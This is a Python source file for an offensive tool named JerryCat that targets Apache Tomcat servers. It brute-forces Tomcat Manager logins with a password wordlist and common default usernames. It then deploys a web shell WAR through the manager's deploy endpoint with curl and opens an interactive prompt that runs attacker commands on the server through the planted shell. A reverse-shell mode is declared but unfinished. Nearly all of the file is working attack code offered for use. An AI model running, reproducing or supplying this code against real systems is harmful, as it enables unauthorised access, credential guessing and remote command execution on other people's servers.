import argparse
import signal
import re
import subprocess
import sys
import concurrent.futures
import requests
from requests.auth import HTTPBasicAuth
from packaging.version import Version

from bs4 import BeautifulSoup

from rich.console import Console
from rich import print
from rich.text import Text

console = Console()

# Global variable to access state of args and my single instance of my class output (yes, not the cleanest way)
global args
global output


# banner of the project
def banner() -> str:
    return '''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠞⢛⣩⡽⠿⠛⠛⠷⣄⠀⠀
⠀⡷⢶⣶⡶⠶⠤⠤⢤⣄⣀⣀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠈⠙⢿⣶⣄⠀⠀⠀⠀⠀⠀⢀⣴⠟⢉⣤⠾⠋⠁⠀⠀⠀⠀⠀⠘⣷⠀
⠀ ⠀⠈⠻⢶⣄⠀⠀⠀⠀⠉⠉⠛⠲⠦⣤⣀⠀⠉⠙⠻⢶⣦⣍⣻⣿⣦⡀⠀⢀⣴⠟⢁⡴⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇
⠀⠀⠀⠀⠀⠀⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢲⣤⣀⣀⣈⣻⣿⣿⠎⠻⣤⠟⠁⣰⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣄⠀⠀⢀⣠⡴⠶⠛⠋⠉⠉⠁⠀⠀⠀⠀⠀⠀⣰⠏⠀⣸⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⡾⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⠀⢀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⢀⣠⠀⠀⠀⠀⠀⠀⠀⢰⠃
⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣾⣀⣀⣀⣤⠟⠃⠀⠀⠀⠀⠀⠀⢠⡏⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠶⠛⠛⠻⠂⠀⠀⠀⠀⠀⠈⢉⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢻⡿⣶⣄⠀⠀⠀⠀⠀⠀⢠⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠈⠛⠀⢰⡄⣶⠀⠀⠀⢀⣤⣶⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⣀⠈⢿⣤⣀⣀⣀⣀⣤⠞⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡶⢦⣄⡈⣷⣿⣀⣠⠶⠋⠻⠿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⣦⠬⠽⠟⠛⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠤⢴⠤⣤⣄⣀⣀⣴⣿⠛⠻⢦⣹⢿⣿⣿⣿⣿⣄⠀⢀⣰⠇⠀⣀⣀⣀⣤⣤⠤⠴⠶⠶⢶⠟⠒⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀  ⠀⠀⠀⢸⣿⣿⣿⣿⣾⣿⡿⢿⡿⠛⢠⣬⣿⣿⣿⣿⣯⣭⣭⣤⣤⣤⣤⣴⣤⣴⣏⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠸⠋⠉⠉⠉⠉⠙⢿⣿⣿⣷⣬⣷⡈⣧⣄⣀⠹⣧⠀⠀⡟⢹⣦⣄⣴⡟⠁⢀⣀⣀⠙⢦⡀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣼⠋⠉⠉⠛⣿⠿⣯⣿⣯⣗⣼⣷⣦⣿⣿⡿⠿⠾⠿⠿⠭⣍⣉⡉⠛⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⡁⠀⠀⠀⢠⡏⢀⡴⠋⠁⠀⠀⠀⢈⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⢦⣸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⠃⠀⠀⣠⡾⣷⠏⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⢿⠷⠤⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠸⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⡼⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀⢰⣷⠃⠀⠀⠀⢸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠉⠙⠒⠒⠒⠒⠒⠒⠒⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠁⠀⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⢰⠃⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

                                                  JerryCat By Anh4ckin3 & Talace

'''


# progress_bar object - serve as a model
'''
Putting in comment as its not use anymore (maybe need it later)
progress_bar = Progress(
    "{task.description}",
    TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
    BarColumn(),
    MofNCompleteColumn(),
    TextColumn("•"),
    TimeElapsedColumn(),
    TextColumn("•"),
    TimeRemainingColumn(),
)'''

# common username list of tomcat's most common username - serve as backup if no user list
common_username: list[str] = [
    "tomcat",
    "manager",
    "role1",
    "root",
    "admin"
]


class output_class:
    def __init__(self):
        self.description = ""

    def message(self, state: str, description: str, clear_before: bool) -> None:
        self.description = description

        if clear_before:
            sys.stdout.write("\033[F")  # back to previous line
            sys.stdout.write("\033[K")  # clear line

        text = Text()

        match state:
            case "credit":
                text.append(f"[+] ", style="pale_turquoise1")
            case "info":
                text.append("[")
                text.append("INFO", style="yellow")
                text.append("] ")
            case "success":
                text.append(f"[+] ", style="bright_green")
            case "failed":
                text.append(f"[-] ", style="red1")
            case "error":
                text.append(f"[!] ", style="orange_red1")
            case "ongoing":
                text.append(f"[*] ", style="dodger_blue2")
            case "exit":
                text.append("[")
                text.append("EXITING", style="red1")
                text.append("] ")

        text.append(self.description)
        console.print(text)

    def verbose(self, state: str, description: str, clear_before: bool) -> None:
        if args.verbose:
            self.message(state, description, clear_before)


# Tomcat class
class tomcat:
    def __init__(self, url: str):
        self.url = url

    def login(self, username, password):
        auth = HTTPBasicAuth(username, password)
        response = requests.get(f"{self.url}/manager/html", auth=auth)
        if response.status_code == 200:
            output.message(state="success", description=f"{username}:{password}", clear_before=False)
            return username, password
        else:
            output.verbose(state="failed", description=f"{username}:{password}", clear_before=False)
            return None

    def version_detection(self):
        response = requests.get(f"{self.url}")
        version = re.search(r"(\d.\d.\d\d)", response.text)[1]

        output.message(state="info", description=f"version: {version}", clear_before=False)

        return version


class unauthenticated_attack(tomcat):
    def __init__(self, url: str, wordlist: str, userlist: str):
        super().__init__(url)
        self.userlist = userlist
        self.wordlist = wordlist

    def brute_force(self):
        if self.userlist is None:
            self.userlist = common_username
        else:
            with open(self.userlist, 'r') as file:
                self.userlist = file.read().splitlines()

        output.message(state="ongoing", description="Brute force is running...", clear_before=False)

        with open(self.wordlist, "r", encoding="utf-8", errors="ignore") as open_wordlist:
            passwords = open_wordlist.readlines()

        with concurrent.futures.ThreadPoolExecutor() as executor:
            tasks = []
            for username in self.userlist:
                for password in passwords:
                    password = password.strip()
                    task = executor.submit(super().login, username, password)
                    tasks.append(task)

            credentials = []

            for future in concurrent.futures.as_completed(tasks):
                result = future.result()

                if result:
                    new_credentials = {'username': result[0], 'password': result[1]}
                    credentials.append(new_credentials)

            output.message(state="success", description="Brute force done!", clear_before=False)

            if credentials:
                return credentials

        return False


class authenticated_attack(tomcat):
    def __init__(self, url: str, username: str, password: str):
        super().__init__(url)
        self.username = username
        self.password = password

    def upload(self):

        response = requests.get(url=f"{self.url}/web_shell/index.jsp")

        if response.status_code != 200:
            command = f'curl --upload-file webshell/web_shell.war -u "{self.username}:{self.password}" "{self.url}/manager/text/deploy?path=/web_shell"'
            subprocess.run(command, shell=True, check=True)

        response = self.execute_webshell_cmd(cmd="whoami")

        if response:
            output.message(state="ongoing", description="Spawning webshell...", clear_before=False)
        else:
            output.message(state="failed", description="An error occur with the webshell", clear_before=False)
            output.message(state="exit", description="Jobs finished ? Jobs not finished", clear_before=False)
            return

        cmd = ''

        while cmd != "exit":
            print("[bold red]Jerrycat[/] > ", end="")
            cmd = input()

            if cmd != "":
                response = self.execute_webshell_cmd(cmd=cmd)
                if response != "":
                    print(response)

    def execute_webshell_cmd(self, cmd: str):
        response = requests.get(f"{self.url}/web_shell/index.jsp?cmd={cmd}")
        soup = BeautifulSoup(response.text, 'html.parser')
        content = soup.find_all('pre')

        return content[0].text


def main():
    global output, args

    # listen for CTRL+C
    signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(output.message(state="exit", description="See you next time!", clear_before=True)))

    parser = argparse.ArgumentParser(description="jerrycat the good guy !")

    # choose mode
    parser.add_argument('mode', metavar='MODE', type=str, choices=['brute', 'exec', 'reverse'],
                        help="Mode: brute, exec, or reverse")

    # url
    parser.add_argument('url', metavar='URL', type=str, help='URL of the tomcat app')

    parser.add_argument('-u', '--user', dest='user', help='tomcat user')
    parser.add_argument('-p', '--password', dest='password', help='tomcat user password')

    parser.add_argument("-v", "--verbose", action="store_true", default=False, help='Output all logs')
    parser.add_argument("--payload", help='Path of your payload [webshell, reverseshell]')

    # Brute mode
    brute_mode = parser.add_argument_group("Brute Options")
    brute_mode.add_argument('-w', '--wordlist', dest='wordlist', help='path on your own wordlist')
    brute_mode.add_argument('-U', '--user-list', dest='userlist', help='User list ( default tomcat )')

    # exec mode - no specific option yet
    webshell_mode = parser.add_argument_group("Command execution Options")

    # reverse shell mode - no specific option yet
    reverse_mode = parser.add_argument_group("reverse shell Options")

    args = parser.parse_args()

    # instance new class
    output = output_class()

    # banner draw of the tool
    print(banner())

    tomcat_instance = tomcat(url=args.url)

    if Version(tomcat_instance.version_detection()) < Version("10"):
        # make something with it later
        pass

    # switch for mode
    match args.mode:
        # settings for brute mode
        case 'brute':
            if not all([args.url, args.wordlist]):
                parser.error(" -u and -w arguments are requires for this mode.")
            else:
                output.message("success", "Mode Brute selected", False)

                tomcat_instance = unauthenticated_attack(url=args.url, wordlist=args.wordlist, userlist=args.userlist)
                credentials_found = tomcat_instance.brute_force()

                if not credentials_found:
                    output.message("failed", f"No user or password is matching ! :(", False)

        # settings for exec mode
        case 'exec':
            if not all([args.url, args.user, args.password]):
                parser.error("-u, -U, -p arguments are requires for this mode.")
            else:
                webshell = authenticated_attack(url=args.url, username=args.user, password=args.password)
                webshell.login(username=args.user, password=args.password)
                webshell.upload()

        # settings for reverse mode
        case 'reverse':
            if not all([args.url, args.user, args.password, args.reverse]):
                parser.error("-u, -U, -p arguments are requires for this mode.")
            else:
                print("Reverse shell mode selected")


if __name__ == "__main__":
    main()
